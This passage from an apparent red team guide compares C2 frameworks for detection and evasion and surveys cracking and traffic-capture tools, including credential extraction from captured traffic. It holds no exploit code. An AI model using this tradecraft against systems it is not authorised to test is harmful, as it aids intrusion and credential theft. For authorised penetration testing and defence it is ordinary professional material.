| Havoc | Capable C implant with good in-memory tradecraft. Development has been intermittent, and its default profile is detected. |
| Cobalt Strike | Commercial, and still the deepest ecosystem: BOFs, malleable profiles, user-defined reflective loaders, post-ex kit customisation. Only worth its price if you actually use the customisation surface. |
| Nighthawk, Brute Ratel | Commercial, evasion-focused. Note that cracked and leaked builds circulate and are consequently among the best-detected binaries in existence, so a leaked copy is worse than useless. |
| Metasploit | Not a red team C2, but an excellent exploitation framework and the fastest route to a shell on an unprotected internal appliance. |
| Empire (BC Security fork), PoshC2, HardHat | Actively maintained smaller projects. Lower ceiling, faster to stand up. |
| Covenant, SILENTTRINITY | Do not start here. Unmaintained and signatured. |

Regardless of framework: the defaults are detected. What separates a working operation from an instant kill is the profile, the loader, the sleep behaviour, the transport, and the infrastructure, not which of the above you chose.

#### Cracking

`hashcat` for anything GPU-accelerable, which is nearly everything you will encounter in AD. `john` (the jumbo build) for exotic formats hashcat lacks, for its `*2john` extractors, and for single-crack mode. Covered in depth below.

#### Traffic capture and analysis

| Tool | What distinguishes it |
| --- | --- |
| `tcpdump` | Capture. Present on everything. Use a capture filter to exclude your own management traffic or your PCAP will be mostly you. |
| `tshark` | Analysis and extraction from the command line. `-z io,phs` for a protocol hierarchy, `-Y` for display filters, `-T fields -e` for extraction into something greppable, `--export-objects` for pulling files out of SMB, HTTP and TFTP streams. |
| `wireshark` / `termshark` | Interactive analysis when you need to actually look at a stream. |
| `PCredz` | Automated credential extraction from live traffic or a PCAP: NTLM challenge-responses, cleartext protocol credentials, SNMP community strings, Kerberos material. |
| `zeek`, `arkime`, `NetworkMiner` | Bulk analysis at volumes where tshark stops being pleasant. |
| `hcxdumptool`, `hcxpcapngtool` | Wireless capture and conversion to hashcat's mode 22000 format. |

The realistic yield from passive capture on a modern internal is: protocol hierarchy showing you what actually exists on the network, NTLM authentications you can attempt to relay or crack, unencrypted legacy management protocols (SNMPv1 and v2c, Telnet, TFTP, syslog, LPD), device and network-layer discovery (CDP, LLDP, DTP, STP, HSRP, VRRP), and clear-text credentials from appliances and printers. Everything user-facing is TLS. Plan accordingly and treat capture as reconnaissance rather than as a credential source.

One thing the source got right and which is easy to forget: check for HSRP and VRRP before doing anything at layer two, and exclude those addresses. Spoofing a first-hop redundancy peer is how you take an entire network offline.

### Cracking infrastructure

The source depends on cracking for Kerberoasting and AS-REP roasting and then gives it two lines. Cracking is infrastructure, and treating it as an afterthought is why operators sit watching `rockyou.txt` finish against a hash that was never going to fall.

#### Hash modes for what this document produces
